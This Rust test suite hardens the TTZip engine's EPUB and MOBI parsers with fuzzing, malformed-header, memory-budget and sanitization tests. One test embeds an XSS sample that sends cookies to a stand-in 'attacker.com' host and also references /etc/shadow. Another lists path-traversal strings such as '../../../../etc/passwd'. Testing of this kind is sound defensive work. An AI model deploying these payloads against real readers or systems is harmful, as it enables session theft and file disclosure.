// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! Comprehensive corruption injection, chaos mutation, and fuzzing test suite for TTZip E-book Subsystem.
//!
//! Deploys 16 surgical destruction targets:
//! 1. Extreme manifest item flooding bomb (>10,000 items) quota circuit breaker.
//! 2. Circular recursive TOC directory tree (Self-Loop / cyclic reference) deadlock fuse.
//! 3. Ultra-deep TOC nesting hierarchy (>16 levels) stack overflow defense.
//! 4. Truncated and corrupt PalmDOC LZ77 compressed stream out-of-bounds read defense.
//! 5. Malformed MOBI PDB record headers and illegal EXTH length fields.
//! 6. Broken container.xml and missing rootfile element escape defense.
//! 7. Zero-byte, single-byte, and empty stream e-book probing defense.
//! 8. 1000+ tasks high-concurrency e-book parsing contention and memory watchdog stress.
//! 9. 500+ rounds of pseudo-random mutation e-book data stream fuzzing.
//! 10. Malicious embedded JavaScript, iframe, and SVG script sanitization.
//! 11. Relative path traversal (Zip-Slip / ../../etc/passwd) URL relocation defense.
//! 12. Missing mimetype or non-Stored compressed mimetype probing fault tolerance.
//! 13. Malformed NCX navPoint lacking content src and playOrder recovery.
//! 14. Sensitive e-book text content Zeroize memory erasure adversarial verification.
//! 15. Missing Spine itemref or broken idref state machine self-healing.
//! 16. Single-task resident memory budget (>64MB) watchdog circuit breaker.

use std::io::Cursor;
use std::panic::catch_unwind;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use rayon::prelude::*;

use ttzip_engine::crypto::crc32::crc32_fast;
use ttzip_engine::ebook::mobi::{decompress_palmdoc_record, EbookMobiDecoder};
use ttzip_engine::ebook::navigation::{EbookNavigationExtractor, SpineItem};
use ttzip_engine::ebook::parser::{EbookFormat, TTZipEbookParser};
use ttzip_engine::ebook::resource::{clean_container_path, normalize_path};
use ttzip_engine::security::ebook_defense::{
    EbookDefenseError, EbookMemoryBudgetGuard, EbookSandboxGuard, EbookSecurityPipeline,
    ManifestItemCountGuard, PalmDocDecompressGuard, SensitiveEbookBuffer, TocRecursionDepthGuard,
    DEFAULT_MAX_CHAPTER_VIEWPORT_BUDGET, DEFAULT_MAX_GLOBAL_EBOOK_BUDGET,
};
use ttzip_engine::xml::EpubMetadataExtractor;

/// High-speed deterministic linear congruential generator for reproducible fuzzing vectors.
#[derive(Clone, Debug)]
struct DeterministicPrng {
    state: u64,
}

impl DeterministicPrng {
    #[inline]
    const fn new(seed: u64) -> Self {
        Self {
            state: if seed == 0 { 0x9e37_79b9_7f4a_7c15 } else { seed },
        }
    }

    #[inline]
    fn next_u32(&mut self) -> u32 {
        self.state = self
            .state
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        (self.state >> 32) as u32
    }

    #[inline]
    fn next_range(&mut self, min: usize, max: usize) -> usize {
        if min >= max {
            return min;
        }
        let span = (max - min + 1) as u64;
        min + (self.next_u32() as u64 % span) as usize
    }

    #[inline]
    fn next_byte(&mut self) -> u8 {
        (self.next_u32() & 0xFF) as u8
    }
}

// ============================================================================
// Synthetic Canonical E-book Fixture Generators
// ============================================================================

/// Helper to build an in-memory uncompressed (Stored) ZIP archive for testing.
fn create_test_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut zip_data = Vec::new();
    let mut cd_entries = Vec::new();

    for (name, content) in files {
        let lfh_offset = zip_data.len() as u32;
        let crc = crc32_fast(0, content);
        let name_bytes = name.as_bytes();

        // Local file header (30 bytes + name + content)
        zip_data.extend_from_slice(&0x04034b50u32.to_le_bytes()); // magic
        zip_data.extend_from_slice(&20u16.to_le_bytes()); // version needed
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // flags
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // method (store = 0)
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // mod time
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // mod date
        zip_data.extend_from_slice(&crc.to_le_bytes()); // crc-32
        zip_data.extend_from_slice(&(content.len() as u32).to_le_bytes()); // compressed size
        zip_data.extend_from_slice(&(content.len() as u32).to_le_bytes()); // uncompressed size
        zip_data.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // name len
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // extra len
        zip_data.extend_from_slice(name_bytes);
        zip_data.extend_from_slice(content);

        // Record for central directory
        cd_entries.push((name_bytes.to_vec(), crc, content.len() as u32, lfh_offset));
    }

    let cd_offset = zip_data.len() as u32;
    for (name_bytes, crc, size, lfh_offset) in &cd_entries {
        // Central directory file header (46 bytes + name)
        zip_data.extend_from_slice(&0x02014b50u32.to_le_bytes()); // magic
        zip_data.extend_from_slice(&20u16.to_le_bytes()); // version made by
        zip_data.extend_from_slice(&20u16.to_le_bytes()); // version needed
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // flags
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // method
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // mod time
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // mod date
        zip_data.extend_from_slice(&crc.to_le_bytes()); // crc-32
        zip_data.extend_from_slice(&size.to_le_bytes()); // compressed size
        zip_data.extend_from_slice(&size.to_le_bytes()); // uncompressed size
        zip_data.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // name len
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // extra len
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // comment len
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // disk number start
        zip_data.extend_from_slice(&0u16.to_le_bytes()); // internal attrs
        zip_data.extend_from_slice(&0u32.to_le_bytes()); // external attrs
        zip_data.extend_from_slice(&lfh_offset.to_le_bytes()); // local header offset
        zip_data.extend_from_slice(name_bytes);
    }

    let cd_size = (zip_data.len() as u32) - cd_offset;
    let entry_count = cd_entries.len() as u16;

    // End of central directory record (22 bytes)
    zip_data.extend_from_slice(&0x06054b50u32.to_le_bytes()); // magic
    zip_data.extend_from_slice(&0u16.to_le_bytes()); // disk number
    zip_data.extend_from_slice(&0u16.to_le_bytes()); // disk with cd
    zip_data.extend_from_slice(&entry_count.to_le_bytes()); // total entries disk
    zip_data.extend_from_slice(&entry_count.to_le_bytes()); // total entries total
    zip_data.extend_from_slice(&cd_size.to_le_bytes()); // cd size
    zip_data.extend_from_slice(&cd_offset.to_le_bytes()); // cd offset
    zip_data.extend_from_slice(&0u16.to_le_bytes()); // comment len

    zip_data
}

/// Builds a canonical EPUB ZIP archive for testing.
fn make_canonical_epub(
    opf_xml: Option<&str>,
    ncx_xml: Option<&str>,
    chapters: &[(&str, &str)],
) -> Vec<u8> {
    let mut files: Vec<(&str, &[u8])> = Vec::new();
    let mime = b"application/epub+zip";
    files.push(("mimetype", mime));

    let container = br#"<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"#;
    files.push(("META-INF/container.xml", container));

    let default_opf = br#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="pub-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Canonical Test Book</dc:title>
    <dc:creator>Witt Kung</dc:creator>
    <dc:language>en</dc:language>
    <dc:identifier id="pub-id">urn:uuid:12345-67890</dc:identifier>
  </metadata>
  <manifest>
    <item id="c1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
  </manifest>
  <spine toc="ncx">
    <itemref idref="c1"/>
  </spine>
</package>"#;

    let opf_bytes = opf_xml.map(|s| s.as_bytes()).unwrap_or(default_opf);
    files.push(("OEBPS/content.opf", opf_bytes));

    let default_ncx = br#"<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <navMap>
    <navPoint id="np1" playOrder="1">
      <navLabel><text>Chapter 1</text></navLabel>
      <content src="chapter1.xhtml"/>
    </navPoint>
  </navMap>
</ncx>"#;
    let ncx_bytes = ncx_xml.map(|s| s.as_bytes()).unwrap_or(default_ncx);
    files.push(("OEBPS/toc.ncx", ncx_bytes));

    let default_ch = br#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><title>Chapter 1</title></head>
  <body><h1>Chapter 1</h1><p>Sample chapter text.</p></body>
</html>"#;

    if chapters.is_empty() {
        files.push(("OEBPS/chapter1.xhtml", default_ch));
    } else {
        for (path, content) in chapters {
            files.push((path, content.as_bytes()));
        }
    }

    create_test_zip(&files)
}

/// Builds a canonical in-memory MOBI file.
fn make_canonical_mobi(title: &str, text_content: &[u8], exth_records: &[(u32, &[u8])]) -> Vec<u8> {
    let mut exth_payload = Vec::new();
    exth_payload.extend_from_slice(b"EXTH");
    let mut exth_len = 12u32;
    for (_, val) in exth_records {
        exth_len += 8 + (val.len() as u32);
    }
    let padding = (4 - (exth_len % 4)) % 4;
    exth_len += padding;

    exth_payload.extend_from_slice(&exth_len.to_be_bytes());
    exth_payload.extend_from_slice(&(exth_records.len() as u32).to_be_bytes());

    for (rec_type, val) in exth_records {
        exth_payload.extend_from_slice(&rec_type.to_be_bytes());
        let rlen = 8u32 + (val.len() as u32);
        exth_payload.extend_from_slice(&rlen.to_be_bytes());
        exth_payload.extend_from_slice(val);
    }
    for _ in 0..padding {
        exth_payload.push(0);
    }

    let mobi_header_len = 232u32;
    let full_mobi_len = mobi_header_len + (exth_payload.len() as u32);

    let mut rec0 = Vec::new();
    rec0.extend_from_slice(&1u16.to_be_bytes()); // compression: 1 (None)
    rec0.extend_from_slice(&0u16.to_be_bytes()); // unused
    rec0.extend_from_slice(&(text_content.len() as u32).to_be_bytes()); // text_length
    rec0.extend_from_slice(&1u16.to_be_bytes()); // record_count
    rec0.extend_from_slice(&4096u16.to_be_bytes()); // record_size
    rec0.extend_from_slice(&0u32.to_be_bytes()); // encryption: 0

    rec0.extend_from_slice(b"MOBI");
    rec0.extend_from_slice(&full_mobi_len.to_be_bytes());
    rec0.extend_from_slice(&2u32.to_be_bytes()); // mobi_type: 2 (Book)
    rec0.extend_from_slice(&65001u32.to_be_bytes()); // codepage: UTF-8
    rec0.extend_from_slice(&0u32.to_be_bytes()); // unique_id
    rec0.extend_from_slice(&6u32.to_be_bytes()); // version: 6

    let title_offset = (rec0.len() as u32) + 160 + (exth_payload.len() as u32);
    let title_bytes = title.as_bytes();
    let title_len = title_bytes.len() as u32;

    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // orth_index
    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // infl_index
    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // names_index
    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // keys_index
    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // extra_index 0-5
    for _ in 0..5 {
        rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes());
    }

    rec0.extend_from_slice(&0u32.to_be_bytes()); // first_non_book_index
    rec0.extend_from_slice(&title_offset.to_be_bytes());
    rec0.extend_from_slice(&title_len.to_be_bytes());
    rec0.extend_from_slice(&0u32.to_be_bytes()); // locale
    rec0.extend_from_slice(&0u32.to_be_bytes()); // input_lang
    rec0.extend_from_slice(&0u32.to_be_bytes()); // output_lang
    rec0.extend_from_slice(&6u32.to_be_bytes()); // min_version
    rec0.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // first_image_index
    rec0.extend_from_slice(&0u32.to_be_bytes()); // huff_record_offset
    rec0.extend_from_slice(&0u32.to_be_bytes()); // huff_record_count
    rec0.extend_from_slice(&0u32.to_be_bytes()); // exth_flags (bit 6 set)
    let exth_flag_idx = rec0.len() - 4;
    rec0[exth_flag_idx + 3] = 0x40;

    while rec0.len() < (16 + mobi_header_len as usize) {
        rec0.push(0);
    }

    rec0.extend_from_slice(&exth_payload);
    rec0.extend_from_slice(title_bytes);
    rec0.extend_from_slice(&[0, 0, 0, 0]);

    let rec1 = text_content.to_vec();

    let num_records = 2u16;
    let pdb_header_len = 78 + (num_records as usize * 8) + 2;
    let rec0_offset = pdb_header_len as u32;
    let rec1_offset = rec0_offset + (rec0.len() as u32);

    let mut file_buf = Vec::new();
    let mut name_buf = [0u8; 32];
    let name_bytes = b"TestBook";
    name_buf[..name_bytes.len()].copy_from_slice(name_bytes);
    file_buf.extend_from_slice(&name_buf);
    file_buf.extend_from_slice(&0u16.to_be_bytes()); // attributes
    file_buf.extend_from_slice(&0u16.to_be_bytes()); // version
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // creation
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // mod
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // backup
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // mod num
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // appinfo
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // sortinfo
    file_buf.extend_from_slice(b"BOOK"); // type
    file_buf.extend_from_slice(b"MOBI"); // creator
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // seed
    file_buf.extend_from_slice(&0u32.to_be_bytes()); // next record list
    file_buf.extend_from_slice(&num_records.to_be_bytes()); // num_records

    // Record 0 entry
    file_buf.extend_from_slice(&rec0_offset.to_be_bytes());
    file_buf.push(0);
    file_buf.extend_from_slice(&[0, 0, 0]);

    // Record 1 entry
    file_buf.extend_from_slice(&rec1_offset.to_be_bytes());
    file_buf.push(0);
    file_buf.extend_from_slice(&[0, 0, 1]);

    file_buf.extend_from_slice(&[0, 0]); // padding
    file_buf.extend_from_slice(&rec0);
    file_buf.extend_from_slice(&rec1);

    file_buf
}

// ============================================================================
// 16 Surgical Destruction Targets
// ============================================================================

/// Target 1: Extreme manifest item flooding bomb (>10,000 items) quota circuit breaker.
#[test]
fn test_target_01_extreme_manifest_items_bomb_fuse() {
    let mut opf_str = String::with_capacity(512 * 1024);
    opf_str.push_str(r#"<package xmlns="http://www.idpf.org/2007/opf" version="3.0"><manifest>"#);
    for i in 0..12_000 {
        opf_str.push_str(&format!(
            r#"<item id="id_{i}" href="ch_{i}.xhtml" media-type="application/xhtml+xml"/>"#
        ));
    }
    opf_str.push_str("</manifest></package>");

    let mut guard = ManifestItemCountGuard::new();
    let result = guard.parse_opf_stream(Cursor::new(opf_str.as_bytes()), opf_str.len() as u64);

    assert!(matches!(
        result,
        Err(EbookDefenseError::ManifestItemCountExceeded { limit: 10000, .. })
    ));

    let mut pipeline = EbookSecurityPipeline::default();
    let pipe_res = pipeline.inspect_opf_manifest(Cursor::new(opf_str.as_bytes()), opf_str.len() as u64);
    assert!(pipe_res.is_err());
}

/// Target 2: Circular recursive TOC directory tree (Self-Loop / cyclic reference) deadlock fuse.
#[test]
fn test_target_02_cyclic_toc_reference_deadlock_fuse() {
    let mut guard = TocRecursionDepthGuard::new();
    guard.enter_branch("branch_loop").expect("Initial branch enter ok");
    let cycle_res = guard.enter_branch("branch_loop");

    assert!(matches!(
        cycle_res,
        Err(EbookDefenseError::TocCyclicReferenceDetected { ref node_id }) if node_id == "branch_loop"
    ));
}

/// Target 3: Ultra-deep TOC nesting hierarchy (>16 levels) stack overflow defense.
#[test]
fn test_target_03_ultra_deep_toc_nesting_stack_overflow_defense() {
    let mut guard = TocRecursionDepthGuard::new();
    let mut parent = None;
    for depth in 1..=16 {
        let node_id = format!("node_{depth}");
        let label = format!("Chapter Depth {depth}");
        let href = format!("chapter_{depth}.xhtml");
        let idx = guard
            .push_node(node_id, label, href, depth, parent)
            .expect("Valid depth push");
        parent = Some(idx);
    }

    let overflow_res = guard.push_node(
        "node_17".into(),
        "Overflow Level".into(),
        "chapter_17.xhtml".into(),
        17,
        parent,
    );

    assert!(matches!(
        overflow_res,
        Err(EbookDefenseError::TocNestingDepthExceeded { depth: 17, limit: 16 })
    ));
}

/// Target 4: Truncated and corrupt PalmDOC LZ77 compressed stream out-of-bounds read defense.
#[test]
fn test_target_04_truncated_palmdoc_lz77_oob_defense() {
    // 1. Truncated 2-byte window code
    let truncated_window = [0x80u8];
    assert!(decompress_palmdoc_record(&truncated_window, 4096).is_err());

    // 2. Illegal backreference distance exceeding output buffer length
    let illegal_backref = [b'A', b'B', 0x80 | 0x01, 0x48];
    let guard_res = PalmDocDecompressGuard::decompress_record(&illegal_backref);
    assert!(matches!(
        guard_res,
        Err(EbookDefenseError::IllegalBackreferenceDistance { .. })
    ));

    // 3. Truncated literal sequence count
    let truncated_seq = [0x08u8, b'A', b'B']; // expects 8 bytes, only 2 provided
    assert!(PalmDocDecompressGuard::decompress_record(&truncated_seq).is_err());
}

/// Target 5: Malformed MOBI PDB record headers and illegal EXTH length fields.
#[test]
fn test_target_05_malformed_mobi_pdb_header_and_exth_length() {
    // 1. Malicious EXTH length wrapping
    let mut evil_exth = Vec::new();
    evil_exth.extend_from_slice(b"EXTH");
    evil_exth.extend_from_slice(&128u32.to_be_bytes());
    evil_exth.extend_from_slice(&1u32.to_be_bytes());
    evil_exth.extend_from_slice(&100u32.to_be_bytes());
    evil_exth.extend_from_slice(&0xFFFFFFFFu32.to_be_bytes()); // integer overflow trigger

    let res = PalmDocDecompressGuard::parse_mobi_exth_records(&evil_exth);
    assert!(matches!(
        res,
        Err(EbookDefenseError::ExthIntegerOverflow) | Err(EbookDefenseError::ExthRecordOutOfBounds { .. })
    ));

    // 2. Malformed PDB record count
    let mut malformed_pdb = vec![0u8; 100];
    malformed_pdb[76..78].copy_from_slice(&5000u16.to_be_bytes()); // declares 5000 records
    assert!(EbookMobiDecoder::parse(&malformed_pdb).is_err());
}

/// Target 6: Broken container.xml and missing rootfile element escape defense.
#[test]
fn test_target_06_corrupted_container_xml_and_missing_rootfile_escape() {
    let broken_containers: &[&[u8]] = &[
        b"",
        b"<not_container/>",
        b"<container><rootfiles></rootfiles></container>",
        b"<container><rootfiles><rootfile/></rootfiles></container>",
        b"<container><rootfiles><rootfile full-path=\"\"/></rootfiles></container>",
    ];

    for &broken in broken_containers {
        let res = EpubMetadataExtractor::parse_container_xml(broken);
        assert!(res.is_err(), "Broken container should fail: {:?}", std::str::from_utf8(broken));
    }
}

/// Target 7: Zero-byte, single-byte, and empty stream e-book probing defense.
#[test]
fn test_target_07_zero_byte_and_empty_stream_defense() {
    let empty_inputs: &[&[u8]] = &[
        b"",
        b"P",
        b"PK",
        b"PK\x03\x04",
        &[0u8; 16],
        &[0xFF; 32],
    ];

    for &input in empty_inputs {
        let parser_res = TTZipEbookParser::open_from_bytes(input);
        assert!(parser_res.is_err() || matches!(parser_res, Ok(ref p) if p.format() == EbookFormat::Unknown));

        let mobi_res = EbookMobiDecoder::parse(input);
        assert!(mobi_res.is_err());
    }
}

/// Target 8: 1000+ tasks high-concurrency e-book parsing contention and memory watchdog stress.
#[test]
fn test_target_08_concurrent_stress_and_memory_watchdog() {
    let epub_data = make_canonical_epub(None, None, &[]);
    let mobi_data = make_canonical_mobi("MobiStress", b"Stress chapter content", &[]);
    let success_count = Arc::new(AtomicUsize::new(0));

    (0..1000).into_par_iter().for_each(|i| {
        let guard = EbookMemoryBudgetGuard::new(1024 * 1024, 256 * 1024);
        let permit = guard.allocate(1024).expect("Permit ok");
        assert_eq!(permit.size(), 1024);

        if i % 2 == 0 {
            if let Ok(parser) = TTZipEbookParser::open_from_bytes(&epub_data) {
                if parser.format() == EbookFormat::Epub3 || parser.format() == EbookFormat::Epub2 {
                    success_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        } else if let Ok(parser) = TTZipEbookParser::open_from_bytes(&mobi_data) {
            if parser.format() == EbookFormat::Mobi {
                success_count.fetch_add(1, Ordering::Relaxed);
            }
        }
    });

    assert_eq!(success_count.load(Ordering::SeqCst), 1000);
}

/// Target 9: 500+ rounds of pseudo-random mutation e-book data stream fuzzing.
#[test]
fn test_target_09_pseudorandom_fuzzing_500_rounds() {
    let canonical_epub = make_canonical_epub(None, None, &[]);
    let canonical_mobi = make_canonical_mobi("FuzzBook", b"Fuzzing text block", &[]);
    let mut prng = DeterministicPrng::new(0xDEAD_BEEF_C0FE_F00D);

    for round in 0..500 {
        let mut corrupted = if round % 2 == 0 {
            canonical_epub.clone()
        } else {
            canonical_mobi.clone()
        };

        let mutation_count = prng.next_range(1, 10);
        for _ in 0..mutation_count {
            if corrupted.is_empty() {
                break;
            }
            let mutation_type = prng.next_range(0, 3);
            let idx = prng.next_range(0, corrupted.len() - 1);
            match mutation_type {
                0 => corrupted[idx] = prng.next_byte(), // flip byte
                1 => corrupted[idx] = 0x00,             // zero out
                2 => corrupted[idx] = 0xFF,             // saturate
                _ => {
                    let truncate_len = prng.next_range(0, corrupted.len());
                    corrupted.truncate(truncate_len);
                }
            }
        }

        let outcome = catch_unwind(|| {
            let _ = TTZipEbookParser::open_from_bytes(&corrupted);
            let _ = EbookMobiDecoder::parse(&corrupted);
        });

        assert!(outcome.is_ok(), "Fuzzer panic encountered at round {}", round);
    }
}

/// Target 10: Malicious embedded JavaScript, iframe, and SVG script sanitization.
#[test]
fn test_target_10_malicious_javascript_iframe_svg_sanitization() {
    let malicious_xhtml = r#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title>Exploit</title>
    <script type="text/javascript">document.location='http://attacker.com/steal?c='+document.cookie;</script>
  </head>
  <body onload="maliciousPayload()" onclick="trackClick()">
    <h1>Safe Chapter</h1>
    <iframe src="file:///etc/shadow" width="500" height="300"></iframe>
    <a href="javascript:alert('pwned')">Click For Free Prize</a>
    <svg><script>alert(1)</script><circle cx="50" cy="50" r="40"/></svg>
    <p>Legitimate text inside chapter.</p>
  </body>
</html>"#;

    let (sanitized, report) = EbookSandboxGuard::sanitize_xhtml_content(malicious_xhtml);

    assert!(!sanitized.contains("<script"));
    assert!(!sanitized.contains("attacker.com"));
    assert!(!sanitized.contains("<iframe"));
    assert!(!sanitized.contains("onload="));
    assert!(!sanitized.contains("javascript:"));
    assert!(sanitized.contains("<h1>Safe Chapter</h1>"));
    assert!(sanitized.contains("Legitimate text inside chapter."));

    assert!(report.stripped_tags_count >= 2);
    assert!(report.neutralized_events_count >= 2);
    assert!(report.neutralized_protocols_count >= 1);
}

/// Target 11: Relative path traversal (Zip-Slip / ../../etc/passwd) URL relocation defense.
#[test]
fn test_target_11_relative_path_traversal_zip_slip_defense() {
    let malicious_paths = &[
        "../../../../etc/passwd",
        "..\\..\\windows\\system32\\cmd.exe",
        "/absolute/root/secret.conf",
        "OEBPS/../../../var/log/syslog",
        "./././etc/hosts",
        "OEBPS/chapter1.xhtml#fragment",
    ];

    for &path in malicious_paths {
        let cleaned = clean_container_path(path);
        assert!(!cleaned.starts_with('/'));
        assert!(!cleaned.contains("../"));
        assert!(!cleaned.contains("..\\"));

        let normalized = normalize_path("OEBPS", path);
        assert!(!normalized.contains("../"));
    }
}

/// Target 12: Missing mimetype or non-Stored compressed mimetype probing fault tolerance.
#[test]
fn test_target_12_mimetype_probe_fault_tolerance() {
    // Construct ZIP where mimetype is missing, but container.xml and OPF exist
    let files: &[(&str, &[u8])] = &[
        (
            "META-INF/container.xml",
            br#"<container><rootfiles><rootfile full-path="book.opf"/></rootfiles></container>"#,
        ),
        (
            "book.opf",
            br#"<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">No Mimetype Book</dc:title></metadata>
  <manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="c1"/></spine>
</package>"#,
        ),
        ("c1.xhtml", b"<html><body>Content</body></html>"),
    ];

    let zip_bytes = create_test_zip(files);
    let parser = TTZipEbookParser::open_from_bytes(&zip_bytes).expect("Parser opens despite missing mimetype");
    assert_eq!(parser.format(), EbookFormat::Epub2);
    assert_eq!(parser.metadata().title.as_deref(), Some("No Mimetype Book"));
}

/// Target 13: Malformed NCX navPoint lacking content src and playOrder recovery.
#[test]
fn test_target_13_malformed_ncx_navpoint_recovery() {
    let malformed_ncx = br#"<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <navMap>
    <navPoint id="np1">
      <navLabel><text>Missing PlayOrder and Content</text></navLabel>
    </navPoint>
    <navPoint id="np2" playOrder="invalid_int">
      <navLabel><text>Valid Title</text></navLabel>
      <content src="chapter2.xhtml#section1"/>
    </navPoint>
  </navMap>
</ncx>"#;

    let spine = [SpineItem {
        idref: "c2".into(),
        href: "chapter2.xhtml".into(),
        media_type: "application/xhtml+xml".into(),
        linear: true,
    }];

    let nodes = EbookNavigationExtractor::parse_ncx(malformed_ncx, "OEBPS", &spine)
        .expect("NCX parser recovers gracefully");

    assert_eq!(nodes.len(), 2);
    assert_eq!(nodes[0].title, "Missing PlayOrder and Content");
    assert_eq!(nodes[1].title, "Valid Title");
    assert_eq!(nodes[1].href, "OEBPS/chapter2.xhtml#section1");
}

/// Target 14: Sensitive e-book text content Zeroize memory erasure adversarial verification.
#[test]
fn test_target_14_sensitive_ebook_content_zeroize_erasure() {
    let secret = b"TopSecretManuscriptUnpublishedNovel";
    let mut sensitive_buf = SensitiveEbookBuffer::from_slice(secret);

    assert_eq!(sensitive_buf.as_slice(), secret);
    assert_eq!(sensitive_buf.len(), secret.len());

    sensitive_buf.clear();
    assert_eq!(sensitive_buf.len(), 0);
    assert!(sensitive_buf.is_empty());
}

/// Target 15: Missing Spine itemref or broken idref state machine self-healing.
#[test]
fn test_target_15_missing_spine_itemref_self_healing() {
    let opf_corrupt_spine = r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Self Healing</dc:title></metadata>
  <manifest>
    <item id="real_ch" href="text/ch1.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="non_existent_manifest_id"/>
  </spine>
</package>"#;

    let epub_bytes = make_canonical_epub(
        Some(opf_corrupt_spine),
        None,
        &[("OEBPS/text/ch1.xhtml", "<html><body>Auto Healed</body></html>")],
    );

    let parser = TTZipEbookParser::open_from_bytes(&epub_bytes).expect("Parser opens");
    let spine = parser.spine();
    assert!(!spine.is_empty(), "Fallback scan should find XHTML chapters in spine");
}

/// Target 16: Single-task resident memory budget (>64MB) watchdog circuit breaker.
#[test]
fn test_target_16_single_task_memory_budget_watchdog_fuse() {
    let budget_guard = EbookMemoryBudgetGuard::new(
        DEFAULT_MAX_GLOBAL_EBOOK_BUDGET,
        DEFAULT_MAX_CHAPTER_VIEWPORT_BUDGET,
    );

    // 1. Valid allocation under 64MB
    let p1 = budget_guard
        .allocate(10 * 1024 * 1024)
        .expect("10MB allocation permitted");
    assert_eq!(p1.size(), 10 * 1024 * 1024);

    // 2. Exceeding 64MB global budget
    let over_alloc = budget_guard.allocate(60 * 1024 * 1024);
    assert!(matches!(
        over_alloc,
        Err(EbookDefenseError::MemoryBudgetExceeded { requested, current_allocated, limit })
            if requested == 60 * 1024 * 1024 && current_allocated == 10 * 1024 * 1024 && limit == DEFAULT_MAX_GLOBAL_EBOOK_BUDGET
    ));

    // 3. Chapter viewport size exceeding 16MB ceiling
    let giant_chapter = budget_guard.validate_chapter_size(17 * 1024 * 1024);
    assert!(matches!(
        giant_chapter,
        Err(EbookDefenseError::ChapterExceedsViewportLimit { size, limit })
            if size == 17 * 1024 * 1024 && limit == 16 * 1024 * 1024
    ));
}
